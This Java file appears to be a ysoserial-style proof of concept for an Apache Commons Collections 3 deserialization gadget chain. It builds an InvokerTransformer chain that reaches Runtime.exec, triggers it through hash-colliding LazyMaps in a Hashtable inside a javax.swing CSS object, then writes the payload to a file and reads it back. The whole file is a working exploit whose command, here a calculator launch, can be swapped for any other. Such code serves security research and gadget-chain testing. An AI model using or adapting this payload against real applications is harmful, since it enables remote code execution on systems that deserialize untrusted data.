package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.swing.text.html.CSS;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC3_Poc11 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map innerMap3 = new HashMap();
        Map innerMap4 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
//        lazyMap1.put("xxxxxx", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        Map lazyMap3 = LazyMap.decorate(innerMap3, transformerChain);
//        lazyMap3.put("zZ", 1);

        lazyMap3.put("tZ", 1);

        Map lazyMap4 = LazyMap.decorate(innerMap3, transformerChain);
//        lazyMap3.put("zZ", 1);

        lazyMap4.put("zZ", 1);
        lazyMap4.put("yy", "yy");
        lazyMap4.put("tZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        hashtable.put(lazyMap3, 3);
        hashtable.put(lazyMap4, 4);

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
//        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
//        lazyMap1.remove("zZ");

//        lazyMap2.remove("yy"); //

        javax.swing.text.html.CSS css = new CSS();
        Field field=css.getClass().getDeclaredField("valueConvertor");
        field.setAccessible(true);//暴力反射
        field.set(css,hashtable);
//        hashtable.put(hashtable,1);
//        outerMap.remove(123);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(css);
        outputStream.close();


        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();
    }
}
